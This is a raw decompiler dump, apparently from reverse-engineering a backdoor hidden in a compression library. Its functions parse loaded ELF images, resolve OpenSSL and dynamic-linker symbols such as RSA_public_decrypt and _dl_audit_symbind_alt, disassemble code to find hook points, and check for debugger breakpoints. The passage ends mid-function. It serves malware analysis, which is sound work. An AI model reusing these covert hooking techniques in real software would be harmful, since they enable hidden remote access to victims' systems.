ulong _Llzma_index_buffer_encode_0(Elf64_Ehdr **p_elf,undefined *elf_info,ctx *ctx)

{
  long lzma_allocator;
  ulong uVar1;
  void *fn_read;
  void *fn___errno_location;
  
  lzma_allocator = get_lzma_allocator(1);
  uVar1 = parse_elf(*p_elf,elf_info);
  if ((int)uVar1 != 0) {
    *(undefined **)(lzma_allocator + 0x10) = elf_info;
    fn_read = (void *)lzma_alloc(0x308,lzma_allocator);
    ctx->fn_read = fn_read;
    if (fn_read != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    fn___errno_location = (void *)lzma_alloc(0x878,lzma_allocator);
    ctx->__errno_location = fn___errno_location;
    if (fn___errno_location != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    uVar1 = (ulong)(ctx->num_imports == 2);
  }
  return uVar1;
}



bool process_shared_libraries_map(ulong *param_1,long **param_2)

{
  char cVar1;
  ulong **ppuVar2;
  ulong **ppuVar3;
  ulong **ppuVar4;
  long *plVar5;
  uint uVar6;
  int iVar7;
  char *pcVar8;
  ulong *puVar9;
  long lVar10;
  char *endptr;
  char *startptr;
  ulong local_30;
  
  if (param_1 == (ulong *)0x0) {
    return false;
  }
                    // Returns "_rtld_global"
  pcVar8 = table_lookup_multi(param_2[1][1],0x5b8,0);
  if (pcVar8 == (char *)0x0) {
    return false;
  }
  do {
    if (param_1[3] == 0) {
      plVar5 = *param_2;
      if (*plVar5 == 0) {
        return false;
      }
      if (plVar5[3] == 0) {
        return false;
      }
      if (plVar5[1] == 0) {
        return false;
      }
      if (plVar5[4] == 0) {
        return false;
      }
      if (plVar5[2] == 0) {
        return false;
      }
      if (plVar5[5] == 0) {
        return false;
      }
      break;
    }
    if (*param_1 == 0) {
      return false;
    }
    endptr = (char *)param_1[1];
    if (endptr == (char *)0x0) {
      return false;
    }
    if (param_1[2] == 0) {
      return false;
    }
    startptr = endptr;
    if (*endptr == '\0') {
      if ((ulong *)**param_2 != (ulong *)0x0) {
        return false;
      }
      **param_2 = (long)param_1;
    }
    else {
      while (cVar1 = *endptr, cVar1 != '\0') {
        endptr = endptr + 1;
        if (cVar1 == '/') {
          startptr = endptr;
        }
      }
      uVar6 = table_get(startptr,endptr);
      plVar5 = *param_2;
      if (uVar6 == 2000) {
        if (plVar5[5] != 0) {
          return false;
        }
        plVar5[5] = (long)param_1;
      }
      else if (uVar6 < 0x7d1) {
        if (uVar6 == 0x590) {
          if (plVar5[2] != 0) {
            return false;
          }
          if (0x10463f < *param_1) {
            return false;
          }
          if ((code *)(*param_1 + 0x400000) < process_shared_libraries_map) {
            return false;
          }
          if (param_1[3] == 0) {
            return false;
          }
          plVar5[2] = (long)param_1;
        }
        else if (uVar6 == 0x7c0) {
          if (plVar5[3] != 0) {
            return false;
          }
          plVar5[3] = (long)param_1;
        }
      }
      else if (uVar6 == 0x938) {
        if (plVar5[4] != 0) {
          return false;
        }
        plVar5[4] = (long)param_1;
      }
      else if (uVar6 == 0xa48) {
        if (plVar5[1] != 0) {
          return false;
        }
        puVar9 = (ulong *)(*(long *)(pcVar8 + 8) + *(long *)param_2[1][1]);
        if (param_1 <= puVar9) {
          return false;
        }
        if (*(ulong *)(pcVar8 + 0x10) < (ulong)((long)param_1 - (long)puVar9)) {
          return false;
        }
        if (param_1[2] != ((long *)param_2[1][1])[4]) {
          return false;
        }
        plVar5[1] = (long)param_1;
      }
    }
    plVar5 = *param_2;
    param_1 = (ulong *)param_1[3];
  } while ((((*plVar5 == 0) || (plVar5[3] == 0)) || (plVar5[1] == 0)) ||
          (((plVar5[4] == 0 || (plVar5[2] == 0)) || (plVar5[5] == 0))));
  ppuVar2 = (ulong **)param_2[4];
  ppuVar3 = (ulong **)param_2[3];
  ppuVar4 = (ulong **)param_2[2];
  lVar10 = *param_2[1];
  if ((undefined8 *)**param_2 == (undefined8 *)0x0) {
    return false;
  }
  iVar7 = parse_elf(*(undefined8 *)**param_2,lVar10);
  if (iVar7 == 0) {
    return false;
  }
  if (*(int *)(lVar10 + 0x4c) == 0) {
    return false;
  }
  if ((*(byte *)(lVar10 + 0xd0) & 0x20) == 0) {
    return false;
  }
  puVar9 = (ulong *)_Ldelta_coder_end_1(lVar10,0x1d0);
  *ppuVar4 = puVar9;
  if (puVar9 < (ulong *)0x1000000) {
    puVar9 = (ulong *)_Ldelta_coder_end_1(lVar10,0x510);
    *ppuVar3 = puVar9;
    if (((ulong *)0xffffff < puVar9) && (0xffffff < *puVar9)) {
      return false;
    }
    puVar9 = (ulong *)_Ldelta_coder_end_1(lVar10,0x798);
    *ppuVar2 = puVar9;
    if (puVar9 < (ulong *)0x1000000) goto LAB_00104904;
  }
  if (0xffffff < *puVar9) {
    return false;
  }
LAB_00104904:
  if (((undefined8 *)(*param_2)[3] != (undefined8 *)0x0) &&
     (iVar7 = parse_elf(*(undefined8 *)(*param_2)[3]), iVar7 != 0)) {
    plVar5 = param_2[5];
    local_30 = 0;
    lVar10 = param_2[1][3];
    if (((undefined8 *)(*param_2)[2] != (undefined8 *)0x0) &&
       (((iVar7 = parse_elf(*(undefined8 *)(*param_2)[2],lVar10), iVar7 != 0 &&
         ((*(byte *)(lVar10 + 0xd0) & 0x20) != 0)) &&
        (lVar10 = _Lmicrolzma_decode_0(lVar10,&local_30,1), 0x597 < local_30)))) {
      *plVar5 = lVar10 + 0x10;
      *(ulong *)(lVar10 + 0x590) = local_30 - 0x598;
      if (((undefined8 *)(*param_2)[5] != (undefined8 *)0x0) &&
         (iVar7 = parse_elf(*(undefined8 *)(*param_2)[5],param_2[1][2]), iVar7 != 0)) {
        iVar7 = _Llzma_index_buffer_encode_0
                          ((Elf64_Ehdr **)(*param_2)[5],(undefined *)param_2[1][2],(ctx *)param_2[6]
                          );
        return iVar7 != 0;
      }
    }
  }
  return false;
}



bool process_shared_libraries(undefined8 *param_1)

{
  int iVar1;
  char *pcVar2;
  int *piVar3;
  bool bVar4;
  undefined8 local_40;
  long local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  pcVar2 = table_lookup_multi(*(long *)(param_1[1] + 8),0x5b0,0x8c0);
  bVar4 = false;
  if (pcVar2 != (char *)0x0) {
    local_38 = param_1[1];
    piVar3 = (int *)(*(long *)(pcVar2 + 8) + **(long **)(local_38 + 8));
    bVar4 = false;
    if (0 < *piVar3) {
      local_40 = *param_1;
      local_30 = param_1[2];
      local_28 = param_1[3];
      local_20 = param_1[4];
      local_18 = param_1[5];
      local_10 = param_1[6];
      iVar1 = process_shared_libraries_map(*(undefined8 *)(piVar3 + 2),&local_40);
      bVar4 = iVar1 != 0;
    }
  }
  return bVar4;
}



undefined8 _Llzma_index_iter_locate_1(long **param_1,ulong *param_2)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  void *fn_EVP_DecryptInit_ex;
  long lVar5;
  byte bVar6;
  char cVar7;
  long lVar8;
  uint uVar9;
  ulong uVar10;
  long *plVar11;
  uint uVar12;
  ulong uVar13;
  long local_80;
  long local_78;
  undefined4 local_70;
  byte local_65;
  undefined4 local_64;
  byte local_60;
  uint local_58;
  ulong local_50;
  ulong local_40;
  ctx *piVar1;
  ctx2 *ctx2;
  
  bVar6 = 0;
  iVar2 = apply_one_entry_ex(0,0x97,0x1f,9);
  if (iVar2 != 0) {
    uVar13 = *param_2;
    plVar11 = &local_80;
    for (lVar8 = 0x16; lVar8 != 0; lVar8 = lVar8 + -1) {
      *(undefined4 *)plVar11 = 0;
      plVar11 = (long *)((long)plVar11 + (ulong)bVar6 * -8 + 4);
    }
    lVar8 = get_lzma_allocator(1);
    *(long *)(lVar8 + 0x10) = param_1[1][4];
    fn_EVP_DecryptInit_ex = (void *)lzma_alloc(0xc08,lVar8);
    ctx2 = (ctx2 *)param_2[7];
    ctx2->fn_EVP_DecryptInit_ex = fn_EVP_DecryptInit_ex;
    if (fn_EVP_DecryptInit_ex != (void *)0x0) {
      (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
    }
    piVar1 = *(ctx **)&ctx2->field_0x118;
    lVar5 = get_lzma_allocator(1);
    *(long *)(lVar5 + 0x10) = param_1[1][2];
    fn_EVP_DecryptInit_ex = (void *)lzma_alloc(0x348);
    piVar1->fn_getuid = fn_EVP_DecryptInit_ex;
    if (fn_EVP_DecryptInit_ex != (void *)0x0) {
      piVar1->num_imports = piVar1->num_imports + 1;
    }
    iVar2 = 0;
    uVar12 = 0xff;
    for (; uVar13 < param_2[1]; uVar13 = uVar13 + local_78) {
      iVar3 = code_dasm(&local_80,uVar13);
      if (iVar3 == 0) {
        return 0;
      }
      if (iVar2 == 0) {
        if (((local_58 == 0x1036) && (((ushort)local_70 & 0x140) == 0x140)) &&
           ((byte)(local_64._1_1_ - 1U) < 2)) {
          bVar6 = 0;
          if ((local_70 & 0x40) == 0) {
            bVar1 = 0;
            if (((local_70 & 0x1040) != 0) &&
               (bVar1 = local_70._1_1_ & 0x10, (local_70 & 0x1000) != 0)) {
              if ((local_70 & 0x20) == 0) {
                bVar6 = 0;
                bVar1 = local_60;
              }
              else {
                bVar1 = local_60 | (byte)((local_65 & 1) << 3);
              }
            }
          }
          else {
            bVar1 = (byte)local_70 & 0x20;
            if ((local_70 & 0x20) == 0) {
              bVar6 = local_64._3_1_;
              if ((local_70 & 0x1040) != 0) {
                bVar1 = local_64._2_1_;
              }
            }
            else {
              bVar6 = local_64._3_1_ | local_65 * '\b' & 8;
              bVar1 = 0;
              if ((local_70 & 0x1040) != 0) {
                bVar1 = local_64._2_1_ | local_65 * '\x02' & 8;
              }
            }
          }
          uVar10 = 0;
          if (((local_70 & 0x100) != 0) && (uVar10 = local_50, (local_64 & 0xff00ff00) == 0x5000000)
             ) {
            uVar10 = local_50 + local_80 + local_78;
          }
          if ((*(uint *)(param_2 + 2) == uVar10) &&
             (((int)(uint)*(ushort *)param_2[4] >> (bVar6 & 0x1f) & 1U) != 0)) {
            *(byte *)((ushort *)param_2[4] + 1) = bVar1;
            iVar2 = 1;
          }
        }
      }
      else if (iVar2 == 1) {
        if ((local_58 & 0xfffffffd) == 0x89) {
          uVar10 = param_2[3];
          uVar9 = local_70 & 0x40;
          if ((local_70 & 0x1040) == 0) {
            uVar4 = 0;
            if ((char)uVar9 != '\0') goto LAB_00104d63;
            if (*(char *)(uVar10 + 2) != '\0') goto LAB_00104e77;
            cVar7 = '\0';
LAB_00104d80:
            if (*(char *)(param_2[4] + 2) != (char)uVar9) goto LAB_00104d89;
          }
          else {
            if ((char)uVar9 == '\0') {
              if ((local_70 & 0x1000) == 0) {
                if (*(char *)(uVar10 + 2) == '\0') {
                  uVar4 = 0;
                  cVar7 = '\0';
                  goto LAB_00104d80;
                }
                goto LAB_00104e77;
              }
              uVar4 = (uint)local_60;
              if ((local_70 & 0x20) != 0) {
                uVar4 = (uint)local_60 | (local_65 & 1) << 3;
              }
            }
            else {
              uVar4 = (uint)local_64._2_1_;
              if ((local_70 & 0x20) != 0) {
                uVar4 = (uint)local_64._2_1_ | (uint)local_65 * 2 & 8;
              }
LAB_00104d63:
              uVar9 = (uint)local_64._3_1_;
              if ((local_70 & 0x20) != 0) {
                uVar9 = (uint)local_64._3_1_ | (local_65 & 1) << 3;
              }
            }
            cVar7 = *(char *)(uVar10 + 2);
            if (cVar7 == (char)uVar4) goto LAB_00104d80;
LAB_00104d89:
            if (((char)uVar9 != cVar7) || (*(char *)(param_2[4] + 2) != (char)uVar4))
            goto LAB_00104e77;
          }
          iVar2 = 2;
          uVar12 = uVar9;
          if (local_58 != 0x89) {
            uVar12 = uVar4;
          }
        }
      }
      else if (iVar2 == 2) {
        if (local_58 == 0x128) {
          bVar6 = 0;
        }
        else {
          if ((local_58 != 0x176) || (local_64._2_1_ != 0)) goto LAB_00104e77;
          bVar6 = 0;
          if ((local_70 & 0x1040) != 0) {
            if ((local_70 & 0x40) == 0) {
              bVar6 = local_70._1_1_ & 0x10;
              if (((local_70 & 0x1000) != 0) && (bVar6 = local_60, (local_70 & 0x20) != 0)) {
                bVar6 = local_60 | (byte)((local_65 & 1) << 3);
              }
            }
            else {
              bVar6 = (byte)local_70 & 0x20;
              if ((local_70 & 0x20) != 0) {
                bVar6 = local_65 * '\x02' & 8;
              }
            }
          }
        }
        if ((byte)uVar12 == bVar6) {
          if ((local_40 < 0x100) && (iVar2 = count_one_bits(), iVar2 == 1)) {
            uVar12 = *(uint *)(param_2 + 2);
            uVar13 = param_2[6];
            lVar8 = **param_1;
            *(byte **)(uVar13 + 0x60) = (byte *)((ulong)uVar12 + lVar8);
            *(char *)(uVar13 + 0x68) = (char)local_40;
            if ((*(byte *)((ulong)uVar12 + lVar8) & local_40) == 0) {
              return 1;
            }
          }
          *(undefined4 *)(param_2 + 5) = 1;
          return 0;
        }
      }
LAB_00104e77:
    }
    *(long *)(lVar8 + 0x10) = param_1[1][4];
    lzma_free(*(undefined8 *)(param_2[7] + 0xa8),lVar8);
    lzma_free(piVar1->fn_getuid,lVar5);
  }
  return 0;
}



undefined8 _Llzma_index_hash_init_part_0(long param_1,ulong param_2,long param_3,long param_4)

{
  undefined4 uVar1;
  int iVar2;
  void *fn_pselect;
  long lVar3;
  long lVar4;
  byte bVar5;
  ulong uVar6;
  ulong uVar7;
  long *plVar8;
  undefined4 *puVar9;
  byte bVar10;
  ulong uVar11;
  byte bVar12;
  undefined4 local_c8;
  undefined4 local_c4;
  long local_c0;
  ulong local_b8;
  undefined4 local_b0;
  undefined4 local_ac;
  undefined4 *local_a8;
  undefined4 *local_a0;
  int local_98;
  long local_90;
  long local_88;
  long local_80;
  long local_78;
  undefined4 local_70;
  byte local_65;
  undefined4 local_64;
  byte local_60;
  int local_58;
  ulong local_50;
  ctx *ctx;
  
  bVar12 = 0;
  iVar2 = _Llzma_index_iter_rewind_cold(0x85,0x12,8,0);
  if (iVar2 != 0) {
    ctx = *(ctx **)(param_4 + 0x118);
    plVar8 = &local_80;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)plVar8 = 0;
      plVar8 = (long *)((long)plVar8 + (ulong)bVar12 * -8 + 4);
    }
    local_c8 = 0;
    local_c4 = 0;
    lVar3 = get_lzma_allocator(1);
    *(undefined8 *)(lVar3 + 0x10) = *(undefined8 *)(*(long *)(param_1 + 8) + 0x10);
    fn_pselect = (void *)lzma_alloc(0x380);
    uVar1 = local_c4;
    ctx->fn_write = fn_pselect;
    if (fn_pselect != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    uVar6 = *(ulong *)(param_3 + 0x100);
    local_c8._0_3_ = CONCAT12(0xff,(undefined2)local_c8);
    local_c8 = CONCAT22(local_c8._2_2_,(undefined2)local_c8) | 0x80;
    local_c4._0_2_ = (ushort)local_c4 | 2;
    uVar11 = *(long *)(param_3 + 0x108) + uVar6;
    local_c4._3_1_ = SUB41(uVar1,3);
    local_c4._0_3_ = CONCAT12(0xff,(ushort)local_c4);
    fn_pselect = (void *)lzma_alloc(0x690,lVar3);
    ctx->fn_pselect = fn_pselect;
    if (fn_pselect != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    while ((uVar6 < uVar11 &&
           (iVar2 = code_dasm(&local_80,uVar6,uVar11), lVar3 = local_78, iVar2 != 0))) {
      if ((local_58 == 0x1036) &&
         ((((ushort)local_70 & 0x140) == 0x140 && ((byte)(local_64._1_1_ - 1U) < 2)))) {
        bVar10 = 0;
        if ((local_70 & 0x40) == 0) {
          bVar5 = 0;
          if ((((local_70 & 0x1040) != 0) &&
              (bVar5 = local_70._1_1_ & 0x10, (local_70 & 0x1000) != 0)) &&
             (bVar5 = local_60, (local_70 & 0x20) != 0)) {
            bVar5 = local_60 | (byte)((local_65 & 1) << 3);
          }
        }
        else {
          bVar5 = (byte)local_70 & 0x20;
          if ((local_70 & 0x20) == 0) {
            bVar10 = local_64._3_1_;
            if ((local_70 & 0x1040) != 0) {
              bVar5 = local_64._2_1_;
            }
          }
          else {
            bVar10 = local_64._3_1_ | local_65 * '\b' & 8;
            bVar5 = 0;
            if ((local_70 & 0x1040) != 0) {
              bVar5 = local_65 * '\x02' & 8 | local_64._2_1_;
            }
          }
        }
        if ((local_70 & 0x100) != 0) {
          uVar7 = local_50;
          if ((local_64 & 0xff00ff00) == 0x5000000) {
            uVar7 = local_50 + local_80 + local_78;
          }
          if ((uVar7 < param_2) && (uVar7 != 0)) {
            plVar8 = &local_c0;
            for (lVar4 = 0x10; lVar4 != 0; lVar4 = lVar4 + -1) {
              *(undefined4 *)plVar8 = 0;
              plVar8 = (long *)((long)plVar8 + (ulong)bVar12 * -8 + 4);
            }
            if (((int)(local_c8 & 0xffff) >> (bVar10 & 0x1f) & 1U) == 0) {
              if (((int)(local_c4 & 0xffff) >> (bVar10 & 0x1f) & 1U) == 0) goto LAB_00104fb8;
              local_c4._0_3_ = CONCAT12(bVar5,(ushort)local_c4);
              puVar9 = &local_ac;
              for (lVar4 = 7; lVar4 != 0; lVar4 = lVar4 + -1) {
                *puVar9 = 0;
                puVar9 = puVar9 + (ulong)bVar12 * -2 + 1;
              }
              local_a8 = &local_c4;
              local_a0 = &local_c8;
            }
            else {
              local_c8._0_3_ = CONCAT12(bVar5,(undefined2)local_c8);
              puVar9 = &local_ac;
              for (lVar4 = 7; lVar4 != 0; lVar4 = lVar4 + -1) {
                *puVar9 = 0;
                puVar9 = puVar9 + (ulong)bVar12 * -2 + 1;
              }
              local_a8 = &local_c8;
              local_a0 = &local_c4;
            }
            local_c0 = lVar3 + uVar6;
            local_b8 = uVar11;
            local_b0 = (int)uVar7;
            local_90 = param_3;
            local_88 = param_4;
            iVar2 = _Llzma_index_iter_locate_1(param_1,&local_c0);
            if (iVar2 != 0) {
              return 1;
            }
            if (local_98 != 0) {
              return 0;
            }
          }
        }
      }
LAB_00104fb8:
      uVar6 = uVar6 + local_78;
    }
  }
  return 0;
}



undefined8 _Llzma_lz_decoder_init_0(long param_1,undefined8 *param_2,undefined4 *param_3,ctx2 *ctx2)

{
  uint uVar1;
  long lVar2;
  long lVar3;
  int iVar4;
  long lVar5;
  char *pcVar6;
  void *fn_EVP_PKEY_free;
  long fn_EC_KEY_get0_group;
  long fn_EVP_CIPHER_CTX_free;
  long lVar7;
  undefined4 *puVar8;
  byte bVar9;
  
  bVar9 = 0;
  iVar4 = _Llzma_index_iter_rewind_cold(0,10,0,0);
  if (iVar4 != 0) {
    lVar5 = get_lzma_allocator(1);
    lVar7 = *(long *)(*(long *)(param_1 + 8) + 0x20);
    *(long *)(lVar5 + 0x10) = lVar7;
                    // Returns "EC_POINT_point2oct"
    pcVar6 = table_lookup_multi(lVar7,0x6e0,0);
    if (*(int *)(*(long *)(*(long *)(param_1 + 8) + 0x18) + 0x4c) != 0) {
      if (pcVar6 != (char *)0x0) {
        lVar7 = *(long *)(pcVar6 + 8);
        lVar2 = **(long **)(*(long *)(param_1 + 8) + 0x20);
        (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
        *(long *)&ctx2->field_0x40 = lVar7 + lVar2;
      }
      fn_EVP_PKEY_free = (void *)lzma_alloc(0x6f8,lVar5);
      ctx2->fn_EVP_PKEY_free = fn_EVP_PKEY_free;
      if (fn_EVP_PKEY_free != (void *)0x0) {
        (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
      }
                    // Returns "EC_KEY_get0_public_key"
      pcVar6 = table_lookup_multi(*(long *)(*(long *)(param_1 + 8) + 0x20),0x268,0);
      fn_EC_KEY_get0_group = lzma_alloc(0x7e8,lVar5);
      ctx2->fn_EC_KEY_get0_group = (void *)fn_EC_KEY_get0_group;
      if (fn_EC_KEY_get0_group != 0) {
        (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
      }
      lVar7 = *(long *)(param_1 + 8);
      if (pcVar6 != (char *)0x0) {
        lVar2 = *(long *)(pcVar6 + 8);
        lVar3 = **(long **)(lVar7 + 0x20);
        (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
        ctx2->fn_RSA_public_decrypt = (void *)(lVar2 + lVar3);
      }
                    // Returns "_dl_audit_symbind_alt"
      pcVar6 = table_lookup_multi(*(long *)(lVar7 + 8),0x9c8,0);
      if (pcVar6 != (char *)0x0) {
        lVar7 = *(long *)(pcVar6 + 8);
        lVar2 = **(long **)(*(long *)(param_1 + 8) + 8);
        *(undefined8 *)(param_3 + 0x42) = *(undefined8 *)(pcVar6 + 0x10);
        *(long *)(param_3 + 0x40) = lVar7 + lVar2;
        iVar4 = process_elf_seg();
        if ((iVar4 != 0) && (iVar4 = resolve_imports(param_1,param_2,param_3,ctx2), iVar4 != 0)) {
          fn_EVP_CIPHER_CTX_free = lzma_alloc(0xb28,lVar5);
          ctx2->fn_EVP_CIPHER_CTX_free = (void *)fn_EVP_CIPHER_CTX_free;
          if (fn_EVP_CIPHER_CTX_free != 0) {
            (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
          }
          iVar4 = _Llzma_filter_flags_decode_0
                            (*(long **)(*(long *)(param_1 + 8) + 8),
                             *(long **)(*(long *)(param_1 + 8) + 0x20),(long)param_3,ctx2);
          if ((iVar4 != 0) &&
             (iVar4 = _Llzma_index_hash_init_part_0(param_1,*param_2,param_3,ctx2), iVar4 != 0)) {
            puVar8 = param_3;
            for (lVar7 = 0x10; lVar7 != 0; lVar7 = lVar7 + -1) {
              *puVar8 = 0;
              puVar8 = puVar8 + (ulong)bVar9 * -2 + 1;
            }
            uVar1 = *(uint *)(*(long **)(param_3 + 0x3e) + 1);
            if (uVar1 < 9) {
              if (uVar1 != 0) {
                lVar7 = **(long **)(param_3 + 0x3e);
                lVar5 = 0;
                do {
                  *(undefined *)((long)param_3 + lVar5) = *(undefined *)(lVar7 + lVar5);
                  lVar5 = lVar5 + 1;
                } while ((ulong)uVar1 << 3 != lVar5);
              }
              return 1;
            }
          }
        }
      }
    }
    lzma_free(ctx2->fn_EVP_PKEY_free,lVar5);
    lzma_free(ctx2->fn_EC_KEY_get0_group,lVar5);
    lzma_free(ctx2->fn_EVP_CIPHER_CTX_free,lVar5);
  }
  return 0;
}



undefined8
install_entries(undefined8 param_1,long *param_2,undefined8 param_3,ctx2 *ctx2,uint *param_5)

{
  long lVar1;
  long lVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  void *fn_EVP_DigestVerifyInit;
  long lVar7;
  char *pcVar8;
  char *pcVar9;
  long lVar10;
  long fn_EVP_CIPHER_CTX_new;
  long lVar11;
  undefined8 extraout_RDX;
  undefined8 extraout_RDX_00;
  undefined8 uVar12;
  code **ppcVar13;
  long lVar14;
  byte bVar15;
  long local_b8;
  long local_b0;
  long local_a8;
  long local_a0;
  long local_98;
  long local_90;
  code *local_88;
  undefined8 local_80;
  undefined8 local_78;
  code *local_70;
  undefined8 local_68;
  undefined8 local_60;
  code *local_58;
  undefined8 local_50;
  undefined8 local_48;
  code *local_40;
  undefined8 local_38;
  undefined8 local_30;
  
  bVar15 = 0;
  iVar3 = apply_one_entry_ex(0,0x1c8,0,0x1d);
  if (iVar3 == 0) {
    return 0;
  }
  local_88 = installed_func_0;
  local_80 = 0x1c000001c8;
  local_70 = installed_func_1;
  local_78 = 0x100000000;
  local_60 = 0x100000000;
  local_48 = 0x100000000;
  local_58 = installed_func_2;
  local_40 = installed_func_3;
  local_38 = 0x19000001c4;
  local_68 = 0x1b000001c8;
  local_50 = 0x1a000001c8;
  local_30 = 0x100000004;
  iVar3 = apply_entries(&local_88,4,apply_one_entry);
  if (iVar3 == 0) {
    return 0;
  }
  ppcVar13 = &local_88;
  for (lVar11 = 0x18; lVar11 != 0; lVar11 = lVar11 + -1) {
    *(undefined4 *)ppcVar13 = 0;
    ppcVar13 = (code **)((long)ppcVar13 + (ulong)bVar15 * -8 + 4);
  }
  local_b8 = 0;
  local_b0 = 0;
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  lVar11 = get_lzma_allocator(1);
  *(long **)(lVar11 + 0x10) = param_2;
  fn_EVP_DigestVerifyInit = (void *)lzma_alloc(0x118,lVar11);
  ctx2->fn_EVP_DigestVerifyInit = fn_EVP_DigestVerifyInit;
  if (fn_EVP_DigestVerifyInit != (void *)0x0) {
    (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
  }
  lVar7 = _Llzma_check_update_0(param_1,&local_b8);
  lVar14 = local_b8;
  if (lVar7 == 0) {
    return 0;
  }
                    // Returns "EVP_DigestVerify"
  pcVar8 = table_lookup_multi((long)param_2,0x408,0);
                    // Returns "EVP_sm"
  pcVar9 = table_lookup_multi((long)param_2,0x188,0);
  if (pcVar9 == (char *)0x0) {
    return 0;
  }
  lVar10 = _Lmicrolzma_decode_0(param_1,&local_b0,0);
  lVar2 = local_b0;
  if (lVar10 == 0) {
    return 0;
  }
  if (pcVar8 != (char *)0x0) {
    fn_EVP_CIPHER_CTX_new = *(long *)(pcVar8 + 8);
    lVar1 = *param_2;
    (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
    *(long *)&ctx2->field_0x88 = fn_EVP_CIPHER_CTX_new + lVar1;
  }
  fn_EVP_CIPHER_CTX_new = lzma_alloc(0x838,lVar11);
  *(long *)&ctx2->field_0xa0 = fn_EVP_CIPHER_CTX_new;
  if (fn_EVP_CIPHER_CTX_new != 0) {
    (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
  }
  iVar3 = FUN_00102530(&local_a8,param_1,param_2,ctx2);
  fn_EVP_CIPHER_CTX_new = local_a8;
  if (iVar3 == 0) {
    return 0;
  }
  *(long *)(param_5 + 0x1e) = local_a8;
  iVar3 = check_software_breakpoint(local_a8,local_a8 + 4,0xe230);
  *param_5 = (uint)(iVar3 != 0);
  lVar1 = lVar7 + lVar14;
  if ((iVar3 != 0) &&
     (iVar3 = apply_method_1(fn_EVP_CIPHER_CTX_new,0,&local_a0,fn_EVP_CIPHER_CTX_new,lVar7 + lVar14,
                             1), lVar1 = local_a0, iVar3 == 0)) {
    return 0;
  }
  local_a0 = lVar1;
  uVar12 = param_1;
  iVar3 = _Llzma_buf_cpy_0(lVar10,lVar2 + lVar10,fn_EVP_CIPHER_CTX_new,local_a0,param_3,&local_90,
                           param_1,param_5);
  iVar4 = FUN_00103320(lVar10,lVar2 + lVar10,fn_EVP_CIPHER_CTX_new,local_a0,&local_98,param_1);
  fn_EVP_DigestVerifyInit = (void *)lzma_alloc(0xc28,lVar11);
  lVar14 = local_90;
  ctx2->fn_EVP_chacha20 = fn_EVP_DigestVerifyInit;
  if (fn_EVP_DigestVerifyInit != (void *)0x0) {
    (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
  }
  if (iVar3 == 0) {
LAB_00105749:
    if (iVar4 == 0) goto LAB_001057aa;
    uVar5 = 0;
LAB_0010577d:
    uVar6 = _Llzma_lzma2_encoder_memusage_0(local_98,param_1,param_3,param_5);
    uVar12 = extraout_RDX_00;
  }
  else {
    if (iVar4 != 0) {
      if (local_90 == local_98) {
        uVar5 = _Llzma_lzma2_encoder_memusage_0(local_90,param_1,param_3,param_5);
        if (uVar5 < 8) {
          return 0;
        }
        goto LAB_00105735;
      }
      uVar5 = _Llzma_lzma2_encoder_memusage_0(local_90,param_1,param_3,param_5);
      goto LAB_0010577d;
    }
    if (iVar3 == 0) goto LAB_00105749;
    uVar5 = _Llzma_lzma2_encoder_memusage_0(local_90,param_1,param_3,param_5);
    uVar6 = 0;
    uVar12 = extraout_RDX;
  }
  if (((uVar6 <= uVar5) && (lVar14 = local_90, 7 < uVar5)) ||
     ((uVar5 <= uVar6 && (lVar14 = local_98, 7 < uVar6)))) {
LAB_00105735:
    *(long *)(param_5 + 10) = lVar14;
    return 1;
  }
LAB_001057aa:
  lzma_free(ctx2->fn_EVP_DigestVerifyInit,lVar11,uVar12);
  lzma_free(*(undefined8 *)&ctx2->field_0xa0,lVar11);
  lzma_free(ctx2->fn_EVP_chacha20,lVar11);
  return 0;
}



// WARNING: Removing unreachable block (ram,0x00105aaf)
// WARNING: Removing unreachable block (ram,0x00105aa0)

undefined  [16] parse_elf_init(long param_1)

{
  void *pvVar1;
  ctx2 *ctx2;
  undefined8 uVar2;
  int *piVar3;
  undefined4 uVar4;
  uint uVar5;
  undefined4 uVar6;
  bool bVar7;
  byte bVar8;
  int iVar9;
  int iVar10;
  long fn_malloc_usable_size;
  long *plVar11;
  void *fn_EVP_MD_CTX_new;
  long lVar12;
  long lVar13;
  char *pcVar14;
  char *pcVar15;
  char *pcVar16;
  char *pcVar17;
  long lVar18;
  long lVar19;
  ulong uVar20;
  ulong uVar21;
  long lVar22;
  ulong uVar23;
  undefined4 *puVar24;
  void *startptr;
  ulong uVar25;
  undefined *puVar26;
  undefined8 uVar27;
  undefined4 *puVar28;
  undefined4 *puVar29;
  ctx2 *pcVar30;
  ulong uVar31;
  undefined8 *puVar32;
  uint uVar33;
  byte bVar34;
  long lVar35;
  long lVar36;
  undefined8 *puVar37;
  ulong uVar38;
  byte bVar39;
  int iVar40;
  code *pcVar41;
  undefined *puVar42;
  ulong uVar43;
  ulong uVar44;
  ulong local_b20;
  undefined4 *local_b10;
  undefined4 local_acc;
  long local_ac8;
  undefined8 local_ac0;
  undefined8 local_ab8;
  undefined8 local_ab0;
  undefined8 local_aa8;
  long local_aa0;
  undefined8 local_a98;
  undefined8 local_a90;
  undefined **local_a88;
  void *local_a80;
  undefined8 *local_a78;
  undefined8 local_a70;
  long *local_a68;
  undefined **local_a60;
  undefined8 *local_a58;
  undefined8 *local_a50;
  undefined8 *local_a48;
  undefined8 local_a40;
  undefined *local_a38;
  long local_a30;
  long local_a28;
